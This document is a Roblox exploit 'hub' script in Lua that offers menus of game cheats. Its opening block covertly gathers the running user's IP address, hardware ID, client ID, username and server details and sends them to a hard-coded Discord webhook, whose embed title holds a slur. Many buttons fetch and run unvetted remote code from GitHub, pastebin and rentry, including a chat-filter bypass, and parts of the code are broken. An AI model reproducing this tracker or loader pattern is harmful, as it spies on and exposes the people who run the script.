task.spawn(function()
    local lp = game.Players.LocalPlayer
    local userName, displayName = lp.Name, lp.DisplayName
    local userId = lp.UserId

    local jobId = game.JobId
    local placeId = game.PlaceId

local function GetServerType()
	if game.PrivateServerId ~= "" then
		if game.PrivateServerOwnerId ~= 0 then
			return "VIPServer"
		else
			return "ReservedServer"
		end
	else
		return "StandardServer"
	end
end

local http = game:GetService("HttpService")
local req = request
local Get = req(
    {
        Url = "https://httpbin.org/ip", 
        Method = 'GET'
        }
        )
local Data = game:GetService('HttpService'):JSONDecode(Get.Body)
IP = Data.origin -- Ip

    local hubName = "RELEASED HUB"
    local currentTime = os.date("%Y-%m-%d %H:%M:%S")

    local identifiedExecutor = identifyexecutor and tostring(identifyexecutor()) or "Unknown"
    local executorName = getexecutorname and tostring(getexecutorname()) or "Unknown"
    local hwid = (gethwid and tostring(gethwid())) or (get_hwid and tostring(get_hwid()))

    local deviceType = game:GetService("UserInputService"):GetPlatform() == Enum.Platform.Windows and "ÃƒÂ°Ã…Â¸Ã¢â‚¬â„¢Ã‚Â»" or "ÃƒÂ°Ã…Â¸Ã¢â‚¬Å“Ã‚Â±"

    local function fetchImage()
        local firstUrl = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. userId .. "&size=150x150&format=Png"
        local secondUrl = game:HttpGet(firstUrl)
        
        local jsonData = http:JSONDecode(secondUrl)
        local imageUrl = jsonData.data[1].imageUrl

        return imageUrl
    end

    function webhook()
        if HWID ~= "8d27e11c92518374" then
            local imageUrl = fetchImage()
            local Body = http:JSONEncode({
                ["username"] = hubName,
                --["avatar_url"] = "thumbnailOfTheWebhook",

                ["embeds"] = {{
                    ["title"] = "Some N- executed your script",
                    ["description"] = "User Device: ".. deviceType,
                    ["type"] = "rich",
                    ["color"] = tonumber(0x000000),
                    ["fields"] = {
                        {
                            ["name"] = "\n\n-----------------------------------------------------Information** **",
                            ["value"] = "Identified Executor: " .. identifiedExecutor .. 
                                        "\nExecutor Name: " .. executorName .. 
                                        "\nServer Players: " .. #game.Players:GetChildren() .. 
                                        "\nServer Type: " .. GetServerType() ..
                                        "\nUsername: [" .. userName .. " (" .. displayName .. 
                                        ")](https://www.roblox.com/users/" .. userId .. 
                                        "/profile)\nClient ID: " .. game:GetService("RbxAnalyticsService"):GetClientId() .. 
                                        "\nHWID: " .. hwid.. "\nIP: " .. IP .. 
                                        "\n-----------------------------------------------------",
                            ["inline"] = false
                        },
                        {
                            ["name"] = "JobId Join",
                            ["value"] = "```Roblox.GameLauncher.joinGameInstance('" .. placeId .. "', '" .. jobId .. "')```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "JobId",
                            ["value"] = "```" .. jobId .. "```",
                            ["inline"] = true
                        },
                    },
                    ["thumbnail"] = {
                        ["url"] = imageUrl
                    },
                    ["footer"] = {
                        ["text"] = "Script ran at " .. currentTime,
                    },
                }},
            })

            local Headers = {
                ["content-type"] = "application/json"
            }

            local Url = "https://discord.com/api/webhooks/1268416377476349952/5MhiFsuJVjqRIwERTkt8ylzo2qFinrFykDXY3e7JgrTpcPiMOojxN2DJlG3hHRAI00BN"

            request({
                Url = Url,
                Body = Body,
                Method = "POST",
                Headers = Headers
            })
        end
    end

    webhook()
end)


local player = game.Players.LocalPlayer


local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/thanhdat4461/OrionMoblie/main/source')))()

local Window = OrionLib:MakeWindow({Name = "Released HUB", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})

--[[
Name = <string> - The name of the UI.
HidePremium = <bool> - Whether or not the user details shows Premium status or not.
SaveConfig = <bool> - Toggles the config saving in the UI.
ConfigFolder = <string> - The name of the folder where the configs are saved.
IntroEnabled = <bool> - Whether or not to show the intro animation.
IntroText = <string> - Text to show in the intro animation.
IntroIcon = <string> - URL to the image you want to use in the intro animation.
Icon = <string> - URL to the image you want displayed on the window.
CloseCallback = <function> - Function to execute when the window is closed.
]]

local Tab = Window:MakeTab({
	Name = "Tsb",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

--[[
Name = <Tsb Stuff> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]

local Section = Tab:AddSection({
	Name = "NAH IM DONE. IM FUCKING DONE THE FANDOM HAS GONE OFF THE PLOT FUCK YOU -manga Gojo"
}) 

--[[
Name = <Scripts for tsb> - The name of the section.
]]

OrionLib:MakeNotification({
	Name = "best gui to search for scripts in 2024 fr fr",
	Content = "the gui was the friends we made along the way including youÃ¢ÂÂ¤Ã¯Â¸Â",
	Image = "rbxassetid://4483345998",
	Time = 5
})

--[[
Title = <string> - The title of the notification.
Content = <string> - The content of the notification.
Image = <string> - The icon of the notification.
Time = <number> - The duration of the notfication.
]]

Tab:AddButton({
	Name = "Kadehub script [DOWN]",
	Callback = function()
getgenv().AutoReport = true
loadstring(game:HttpGet("https://raw.githubusercontent.com/skibiditoiletfan2007/KadeHubRepository/main/Latest.lua"))() 

  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "Ms Hacker's Script'",
	Callback = function()
getgenv().changeAnim = function(OGAnim, NewAnim, NewAnimSpeed, NewAnimTPos)
local player = game.Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoid = character:WaitForChild("Humanoid")
    
    humanoid.AnimationPlayed:Connect(function(d)
if d.Animation.AnimationId == "rbxassetid://"..tostring(OGAnim) then
d:Stop()

        local pchar= game.Players.LocalPlayer.Character
        local AnimationId = tostring(NewAnim)
        local Anim = Instance.new("Animation")
        Anim.AnimationId = "rbxassetid://"..AnimationId
        local k = pchar:FindFirstChildOfClass('Humanoid'):LoadAnimation(Anim)
        k:Play()
if NewAnimSpeed then
k:AdjustSpeed(NewAnimSpeed)
end
if NewAnimTPos then
k.TimePosition = NewAnimTPos
end
       end
end)
end

  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "Secret's script [DOWN]",
	Callback = function()
getgenv().scriptWl = "KidsOnlyJoinDiscordIfScriptsDown"
getgenv().ToggleKeybind = Enum.KeyCode.RightControl
loadstring(game:HttpGet("https://raw.githubusercontent.com/ATrain-Roblox/main/main/Phantasm.lua"))()

  	end    
})

Tab:AddButton({
	Name = "l0ckerz",
	Callback = function()	loadstring(game:HttpGet("https://github.com/l0ckerV5/Roblox-Scripts/raw/main/The-Strongest-Battlegrounds/Plugin-v1.20.91"))()
  	end    
})

Tab:AddButton({
	Name = "Void ppl",
	Callback = function()	loadstring(game:HttpGet("https://github.com/l0ckerV5/Roblox-Scripts/raw/main/The%20Strongest%20Battlegrounds/Auto%20Void"))()
  	end    
})

Tab:AddButton({
	Name = "Atrain",
	Callback = function()	loadstring(game:HttpGet("https://github.com/l0ckerV5/Roblox-Scripts/raw/main/The%20Strongest%20Battlegrounds/Custom%20Character/A-Train"))()
  	end    
})

Tab:AddButton({
	Name = "Client Anims (doesnt work)",
	Callback = function()	loaestring(game:HttpGet('https://raw.githubusercontent.com/xVicity/BURNED/main/LATEST.lua'))()
  	end    
})

Tab:AddButton({
	Name = "Mautiku Script",
	Callback = function()	loadstring(game:HttpGet('https://raw.githubusercontent.com/Mautiku/ehh/main/strong%20guest.lua.txt'))()
  	end    
})

Tab:AddButton({
	Name = "Catsus script",
	Callback = function()      		loadstring(game:HttpGet("https://raw.githubusercontent.com/3345-c-a-t-s-u-s/New-C4-Remote.lua/main/TSBG.jsx"))()
  	end    
})

Tab:AddButton({
	Name = "Kj Script (doesnt work anymore)",
	Callback = function()	loadstring(game:HttpGet("https://raw.githubusercontent.com/ProScripter123/Script/main/Kj.lua"))()
  	end    
})

Tab:AddButton({
	Name = "Anti Lag!",
	Callback = function()	loadstring(game:HttpGet(('https://raw.githubusercontent.com/VikiChardd/AntiLag_TSB/main/Protect_MeowTBS1999.lua.txt')))()
  	end    
})

Tab:AddButton({
	Name = "Test",
	Callback = function() loadstring(game:HttpGet"https://pastebin.com/raw/nPanvCvx")()
  	end    
})
Tab:AddButton({
	Name = "Glacier Hub!",
	Callback = function()	loadstring(game:HttpGet("https://raw.githubusercontent.com/xVicity/GLACIER/main/LATEST.lua"))()
  	end    
})
  
Tab:AddButton({
	Name = "SKULLY (key is RoscriptsOnTop)",
	Callback = function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/RealOfficialSkully/Smm/main/Smm"))()
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]
  
Tab:AddButton({
	Name = "Sk811 (key is AnotherScript)",
	Callback = function()
      		loadstring(game:HttpGet("https://raw.githubusercontent.com/RealOfficialSkully/Nah/main/Nah"))()
  	end    
})
Tab:AddButton({
	Name = "Aquarius Hub",
	Callback = function()
      		loadstring(game:HttpGet("https://rentry.org/aquarius-hub/raw"))()
  	end    
})

Tab:AddButton({
	Name = "BETLESS HUB",
	Callback = function()
loadstring(game:HttpGet("https://rentry.org/betless-hub-x/raw"))()

Tab:AddButton({
	Name = "Gojo moveset (key is zenon12345)",
	Callback = function()
loadstring(game:HttpGet("https://rawscripts.net/raw/The-Strongest-Battlegrounds-Gojo-Moveset-Script-FIX-16704"))()

Tab:AddButton({
	Name = "AlperPro (BEST KJ SCRIPT)",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/AlperPro/shhh/main/KJ%20Script.lua"))() 

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]
  
--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]  
  
--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "Nil's premium Script (idk the key)",
	Callback = function()	loadstring(game:HttpGet("https://raw.githubusercontent.com/JayXSama/ray-makk/main/Free%20Private%20Playtest"))()
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]    

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]
--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]
local Tab = Window:MakeTab({
	Name = "jjs",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]

local Section = Tab:AddSection({
	Name = "Mew for life"
})

--[[
Name = <string> - The name of the section.
]]

Tab:AddButton({
	Name = "Nil script",
	Callback = function()    		loadstring(game:HttpGet("https://raw.githubusercontent.com/JayXSama/ray-makk/main/Loader"))()
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "Black Flash 100%",
	Callback = function()	loadstring(game:HttpGet("https://pastebin.com/raw/2cxCR5z3"))()
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "Legend's script",
	Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/LOLking123456/Jujutsu/main/Shenanigans"))()
  	end    
})


local Tab = Window:MakeTab({
	Name = "KjMr",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]

local Section = Tab:AddSection({
	Name = "trolling kids with dis one"
})

--[[
Name = <string> - The name of the section.
]]

Tab:AddButton({
	Name = "Kjmr!",
	Callback = function()
      		local player = game.Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local toolNames = {"20-20-20 Dropkick", "Unlimited Flexworks", "Stoic Bomb", "Five Seasons"}

local function getTools()
    local toolsFound = false

    for _, tool in ipairs(game:GetDescendants()) do
        if tool:IsA("Tool") then
            for _, name in ipairs(toolNames) do
                if tool.Name == name then
                    local clonedTool = tool:Clone()
                    clonedTool.Parent = player.Backpack
                    print(name .. " has been added to your inventory.")
                    toolsFound = true
                    break
                end
            end
        end
    end

    if not toolsFound then
        print("None of the specified tools were found.")
    end
end

local function onCharacterAdded(character)
    character:WaitForChild("Humanoid").Died:Connect(function()
        getTools()
    end)
end

player.CharacterAdded:Connect(onCharacterAdded)
if player.Character then
    onCharacterAdded(player.Character)
end

getTools()

  	end    
})

--[[

Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]
local Tab = Window:MakeTab({
	Name = "Mm2",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

--[[

Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]
local Section = Tab:AddSection({
	Name = "Best Mm2 scripts for ya"
})

--[[
Name = <string> - The name of the section.
]]

Tab:AddButton({
	Name = "Tbao",
	Callback = function()	loadstring(game:HttpGet("https://raw.githubusercontent.com/tbao143/thaibao/main/TbaoHubMurderMystery2") )( )
 
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "R3TH",
	Callback = function()	loadstring(game:HttpGet('https://raw.githubusercontent.com/R3TH-PRIV/R3THPRIV/main/loader.lua'))()
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]
  
local Tab = Window:MakeTab({
	Name = "fe chat bypass",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]

  local Section = Tab:AddSection({
	Name = "Omg Making kids say it too with dis oneÃ°Å¸â€Â¥"
})

--[[
Name = <string> - The name of the section.
]]

Tab:AddButton({
	Name = "Chat Bypass!",
	Callback = function()
      		loadstring(game:HttpGet("https://pastebin.com/raw/T4FEyvHH"))()
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

local Tab = Window:MakeTab({
	Name = "CCURE STUFF [TSB]",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]

local Section = Tab:AddSection({
	Name = "These scripts was made by ccure!"
})

--[[
Name = <string> - The name of the section.
]]

Tab:AddButton({
	Name = "Dummy uses kj awk",
	Callback = function()
      		local player = game.Workspace.Live["Weakest Dummy"]
repeat wait() until player.Humanoid
local dummyhumanoid = game.Workspace.Live["Weakest Dummy"]["Humanoid"]

local soundeffect = Instance.new("Sound")
soundeffect.SoundId = "rbxassetid://17150550559"
soundeffect.Parent = game.Workspace.Live["Weakest Dummy"]["Torso"]
soundeffect:Play()
soundeffect.Volume = 3

local soundeffect = Instance.new("Sound")
soundeffect.SoundId = "rbxassetid://17150550302"
soundeffect.Parent = game.Workspace.Live["Weakest Dummy"]["Torso"]
soundeffect:Play()
soundeffect.Volume = 5

local anim2 = Instance.new("Animation")
anim2.AnimationId = "rbxassetid://17140902079"

local playAnim2 = dummyhumanoid:LoadAnimation(anim2)
playAnim2:Play()

local fine = game.ReplicatedStorage.Resources.KJEffects["fine...1"].EnableBatch2:Clone()
fine.Parent = game.Workspace.Live["Weakest Dummy"]["Torso"]
    for _, child in ipairs(fine:GetChildren()) do
        if child:IsA("ParticleEmitter") then -- Check if the child is a ParticleEmitter
            child:Emit(1) -- Emit 20 particles
        end
    end
local fine3 = game.ReplicatedStorage.Resources.KJEffects["fine...Emit"].EmitBatch3:Clone()
fine3.Parent = game.Workspace.Live["Weakest Dummy"]["Torso"]
    for _, child in ipairs(fine3:GetChildren()) do
        if child:IsA("ParticleEmitter") then -- Check if the child is a ParticleEmitter
            child:Emit(1) -- Emit 20 particles
        end
    end
local red = game.ReplicatedStorage.Resources.KJEffects["fine...1"].REDDDD1:Clone()
red.Parent = game.Workspace.Live["Weakest Dummy"]["Right Leg"]
    for _, child in ipairs(red:GetChildren()) do
        if child:IsA("ParticleEmitter") then -- Check if the child is a ParticleEmitter
            child:Emit(1) -- Emit 20 particles
        end
    end
local red2 = game.ReplicatedStorage.Resources.KJEffects["fine...1"].REDDDD2:Clone()
red2.Parent = game.Workspace.Live["Weakest Dummy"]["Left Leg"]
    for _, child in ipairs(red2:GetChildren()) do
        if child:IsA("ParticleEmitter") then -- Check if the child is a ParticleEmitter
            child:Emit(1) -- Emit 20 particles
        end
    end
local red3 = game.ReplicatedStorage.Resources.KJEffects["fine...1"].REDDDD3:Clone()
red3.Parent = game.Workspace.Live["Weakest Dummy"]["Left Leg"]
    for _, child in ipairs(red3:GetChildren()) do
        if child:IsA("ParticleEmitter") then -- Check if the child is a ParticleEmitter
            child:Emit(1) -- Emit 20 particles
        end
    end
local red4 = game.ReplicatedStorage.Resources.KJEffects["fine...1"].REDDDD4:Clone()
red4.Parent = game.Workspace.Live["Weakest Dummy"]["Right Leg"]
    for _, child in ipairs(red4:GetChildren()) do
        if child:IsA("ParticleEmitter") then -- Check if the child is a ParticleEmitter
            child:Emit(1) -- Emit 20 particles
        end
    end
wait(8.2)
game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
fine:Destroy()
red:Destroy()
red2:Destroy()
red3:Destroy()
red4:Destroy()
local fine2 = game.ReplicatedStorage.Resources.KJEffects["fine...Emit2"].EmitBatch1:Clone()
fine2.Parent = game.Workspace.Live["Weakest Dummy"]["Right Arm"]
    for _, child in ipairs(fine2:GetChildren()) do
        if child:IsA("ParticleEmitter") then -- Check if the child is a ParticleEmitter
            child:Emit(1) -- Emit 20 particles
        end
    end
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "Saitama Into combat god",
	Callback = function()
      		local player = game.Players.LocalPlayer

local playerGui = player.PlayerGui

local hotbar = playerGui:FindFirstChild("Hotbar")

local backpack = hotbar:FindFirstChild("Backpack")

local hotbarFrame = backpack:FindFirstChild("Hotbar")

local baseButton = hotbarFrame:FindFirstChild("1").Base

local ToolName = baseButton.ToolName


ToolName.Text = "One Inch Killer Punch"


local player = game.Players.LocalPlayer

local playerGui = player.PlayerGui

local hotbar = playerGui:FindFirstChild("Hotbar")

local backpack = hotbar:FindFirstChild("Backpack")

local hotbarFrame = backpack:FindFirstChild("Hotbar")

local baseButton = hotbarFrame:FindFirstChild("2").Base

local ToolName = baseButton.ToolName


ToolName.Text = "Hand Bullets"


local player = game.Players.LocalPlayer

local playerGui = player.PlayerGui

local hotbar = playerGui:FindFirstChild("Hotbar")

local backpack = hotbar:FindFirstChild("Backpack")

local hotbarFrame = backpack:FindFirstChild("Hotbar")

local baseButton = hotbarFrame:FindFirstChild("3").Base

local ToolName = baseButton.ToolName


ToolName.Text = "Light Speed"


local player = game.Players.LocalPlayer

local playerGui = player.PlayerGui

local hotbar = playerGui:FindFirstChild("Hotbar")

local backpack = hotbar:FindFirstChild("Backpack")

local hotbarFrame = backpack:FindFirstChild("Hotbar")

local baseButton = hotbarFrame:FindFirstChild("4").Base

local ToolName = baseButton.ToolName


ToolName.Text = "Upper Throw"


local Players = game:GetService("Players")

local player = Players.LocalPlayer

local playerGui = player:WaitForChild("PlayerGui")


local function findGuiAndSetText()

    local screenGui = playerGui:FindFirstChild("ScreenGui")

    if screenGui then

        local magicHealthFrame = screenGui:FindFirstChild("MagicHealth")

        if magicHealthFrame then

            local textLabel = magicHealthFrame:FindFirstChild("TextLabel")

            if textLabel then

                textLabel.Text = "COMBAT GODS"

            end

        end

    end

end


playerGui.DescendantAdded:Connect(findGuiAndSetText)

findGuiAndSetText()


local animationId = 10468665991


local player = game.Players.LocalPlayer

local character = player.Character or player.CharacterAdded:Wait()

local humanoid = character:WaitForChild("Humanoid")


local function onAnimationPlayed(animationTrack)

    if animationTrack.Animation.AnimationId == "rbxassetid://" .. animationId then


local p = game.Players.LocalPlayer

local Humanoid = p.Character:WaitForChild("Humanoid")


for _, animTrack in pairs(Humanoid:GetPlayingAnimationTracks()) do

    animTrack:Stop()

end

message = "ONE INCH KILLER PUNCH!"
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")


local AnimAnim = Instance.new("Animation")

AnimAnim.AnimationId = "rbxassetid://17889458563"

local Anim = Humanoid:LoadAnimation(AnimAnim)


local startTime = 0


Anim:Play()

Anim:AdjustSpeed(0)

Anim:AdjustSpeed(1.2)

wait(0.18)

Anim:AdjustSpeed(0)

wait(0.6)

Anim:AdjustSpeed(1)


    end

end


humanoid.AnimationPlayed:Connect(onAnimationPlayed)


local animationId = 10466974800


local player = game.Players.LocalPlayer

local character = player.Character or player.CharacterAdded:Wait()

local humanoid = character:WaitForChild("Humanoid")


local function onAnimationPlayed(animationTrack)

    if animationTrack.Animation.AnimationId == "rbxassetid://" .. animationId then


local p = game.Players.LocalPlayer

local Humanoid = p.Character:WaitForChild("Humanoid")


for _, animTrack in pairs(Humanoid:GetPlayingAnimationTracks()) do

    animTrack:Stop()

end

message = "You're done for..."
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")

local AnimAnim = Instance.new("Animation")

AnimAnim.AnimationId = "rbxassetid://13146710762"

local Anim = Humanoid:LoadAnimation(AnimAnim)


Anim:Play()

Anim:AdjustSpeed(0)

Anim:AdjustSpeed(1.7)

task.wait(0.5)

Anim:AdjustSpeed(0.5)

task.wait(0.5)

Anim:AdjustSpeed(1)



    end

end


humanoid.AnimationPlayed:Connect(onAnimationPlayed)


local animationId = 10471336737


local player = game.Players.LocalPlayer

local character = player.Character or player.CharacterAdded:Wait()

local humanoid = character:WaitForChild("Humanoid")


local function onAnimationPlayed(animationTrack)

    if animationTrack.Animation.AnimationId == "rbxassetid://" .. animationId then


local p = game.Players.LocalPlayer

local Humanoid = p.Character:WaitForChild("Humanoid")


for _, animTrack in pairs(Humanoid:GetPlayingAnimationTracks()) do

    animTrack:Stop()

end

message = "THIS IS IT!"
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")

local AnimAnim = Instance.new("Animation")

AnimAnim.AnimationId = "rbxassetid://15957361339"

local Anim = Humanoid:LoadAnimation(AnimAnim)


local startTime = 0


Anim:Play()

Anim:AdjustSpeed(0)

Anim.TimePosition = startTime

Anim:AdjustSpeed(1)

task.wait(0.45)

local AnimAnim2 = Instance.new("Animation")

AnimAnim2.AnimationId = "rbxassetid://12832505612"

local Anim2 = Humanoid:LoadAnimation(AnimAnim2)


local startTime = 1.4


Anim:Stop()

Anim2:Play()

Anim2:AdjustSpeed(0)

Anim2.TimePosition = startTime

Anim2:AdjustSpeed(1)


    end

end

humanoid.AnimationPlayed:Connect(onAnimationPlayed)


local animationId = 12510170988


local player = game.Players.LocalPlayer

local character = player.Character or player.CharacterAdded:Wait()

local humanoid = character:WaitForChild("Humanoid")


local function onAnimationPlayed(animationTrack)

    if animationTrack.Animation.AnimationId == "rbxassetid://" .. animationId then

local p = game.Players.LocalPlayer

local Humanoid = p.Character:WaitForChild("Humanoid")


for _, animTrack in pairs(Humanoid:GetPlayingAnimationTracks()) do

    animTrack:Stop()

end

message = "Gotta throw you outta here."
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")

local AnimAnim = Instance.new("Animation")

AnimAnim.AnimationId = "rbxassetid://15295895753"

local Anim = Humanoid:LoadAnimation(AnimAnim)


local startTime = 0.7

Anim:Play()

Anim:AdjustSpeed(0)

Anim.TimePosition = startTime

Anim:AdjustSpeed(1)

    end

end


humanoid.AnimationPlayed:Connect(onAnimationPlayed)

local animationId = 12447707844


local player = game.Players.LocalPlayer

local character = player.Character or player.CharacterAdded:Wait()

local humanoid = character:WaitForChild("Humanoid")


local function onAnimationPlayed(animationTrack)

    if animationTrack.Animation.AnimationId == "rbxassetid://" .. animationId then

local p = game.Players.LocalPlayer

local Humanoid = p.Character:WaitForChild("Humanoid")


for _, animTrack in pairs(Humanoid:GetPlayingAnimationTracks()) do

    animTrack:Stop()

end

message = "That's it..."
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")

local AnimAnim = Instance.new("Animation")

AnimAnim.AnimationId = "rbxassetid://18435303746"

local Anim = Humanoid:LoadAnimation(AnimAnim)


local startTime = 0


Anim:Play()

Anim:AdjustSpeed(0)

Anim.TimePosition = startTime

Anim:AdjustSpeed(1)

    end

end

humanoid.AnimationPlayed:Connect(onAnimationPlayed)

local animationId = 11365563255


local player = game.Players.LocalPlayer

local character = player.Character or player.CharacterAdded:Wait()

local humanoid = character:WaitForChild("Humanoid")


local function onAnimationPlayed(animationTrack)

    if animationTrack.Animation.AnimationId == "rbxassetid://" .. animationId then

local p = game.Players.LocalPlayer

local Humanoid = p.Character:WaitForChild("Humanoid")


for _, animTrack in pairs(Humanoid:GetPlayingAnimationTracks()) do

    animTrack:Stop()

end

message = "You're not ready for this..."
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")

local AnimAnim = Instance.new("Animation")

AnimAnim.AnimationId = "rbxassetid://16431491215"

local Anim = Humanoid:LoadAnimation(AnimAnim)


Anim:Play()

Anim:AdjustSpeed(0)

Anim:AdjustSpeed(0.05)

task.wait(3)

Anim:AdjustSpeed(0.3)

message = "This is the end for you..."
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")

task.wait(2)

message = "...THEREFORE I WILL END IT!"
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")

    end

end

humanoid.AnimationPlayed:Connect(onAnimationPlayed)


local Players = game:GetService("Players")

local player = Players.LocalPlayer

local character = player.Character or player.CharacterAdded:Wait()

local humanoid = character:WaitForChild("Humanoid")


local animationIdsToStop = {

    [10469493270] = true,

    [10469630950] = true,

    [10469639222] = true,

    [10469643643] = true,

}


local replacementAnimations = {

    ["10469643643"] = "rbxassetid://17889290569",

    ["10469639222"] = "rbxassetid://17889471098",

    ["10469630950"] = "rbxassetid://17889461810",

    ["10469493270"] = "rbxassetid://17889458563",


}


local queue = {}

local isAnimating = false


local function playReplacementAnimation(animationId)

    if isAnimating then

        table.insert(queue, animationId)

        return

    end

   

    isAnimating = true

    local replacementAnimationId = replacementAnimations[tostring(animationId)]

    if replacementAnimationId then

        local AnimAnim = Instance.new("Animation")

        AnimAnim.AnimationId = replacementAnimationId

        local Anim = humanoid:LoadAnimation(AnimAnim)

        Anim:Play()

       

        Anim.Stopped:Connect(function()

            isAnimating = false

            if #queue > 0 then

                local nextAnimationId = table.remove(queue, 1)

                playReplacementAnimation(nextAnimationId)

            end

        end)

    else

        isAnimating = false

    end

end


local function stopSpecificAnimations()

    for _, track in ipairs(humanoid:GetPlayingAnimationTracks()) do

        local animationId = tonumber(track.Animation.AnimationId:match("%d+"))

        if animationIdsToStop[animationId] then

            track:Stop()

        end

    end

end


local function onAnimationPlayed(animationTrack)

    local animationId = tonumber(animationTrack.Animation.AnimationId:match("%d+"))

    if animationIdsToStop[animationId] then

        stopSpecificAnimations()

        animationTrack:Stop()

       

        local replacementAnimationId = replacementAnimations[tostring(animationId)]

        if replacementAnimationId then

            playReplacementAnimation(animationId)

        end

    end

end


humanoid.AnimationPlayed:Connect(onAnimationPlayed)


local player = game.Players.LocalPlayer

local character = player.Character or player.CharacterAdded:Wait()

local humanoidRootPart = character:WaitForChild("HumanoidRootPart")


local function onBodyVelocityAdded(bodyVelocity)

    if bodyVelocity:IsA("BodyVelocity") then

        bodyVelocity.Velocity = Vector3.new(bodyVelocity.Velocity.X, 0, bodyVelocity.Velocity.Z)

    end

end


character.DescendantAdded:Connect(onBodyVelocityAdded)


for _, descendant in pairs(character:GetDescendants()) do

    onBodyVelocityAdded(descendant)

end


player.CharacterAdded:Connect(function(newCharacter)

    character = newCharacter

    humanoidRootPart = character:WaitForChild("HumanoidRootPart")

    character.DescendantAdded:Connect(onBodyVelocityAdded)

   

    for _, descendant in pairs(character:GetDescendants()) do

        onBodyVelocityAdded(descendant)

    end

end)
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "20 20 20 dropkick tool",
	Callback = function()
      	-- Create the Tool instance
local tool = Instance.new("Tool")

-- Set the tool's properties
tool.Name = "20-20-20 Dropkick"
tool.RequiresHandle = false  -- Set to true if you have a handle part
tool.CanBeDropped = true     -- Change as needed

-- Add a description or other properties
tool.ToolTip = "The infamous dropkick from KJ."

-- Function to make stuff happen when activated
local function activateTool()
local p = game.Players.LocalPlayer
local Humanoid = p.Character:WaitForChild("Humanoid")

local AnimAnim = Instance.new("Animation")
AnimAnim.AnimationId = "rbxassetid://17354976067"
local Anim = Humanoid:LoadAnimation(AnimAnim)
AnimAnim.AnimationId = "rbxassetid://0" -- Reset animation ID
Anim:Play()

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local function setWalkSpeedToZero()
    local humanoid = character:WaitForChild("Humanoid")
    humanoid.WalkSpeed = 0
end

if character then
    setWalkSpeedToZero()
end

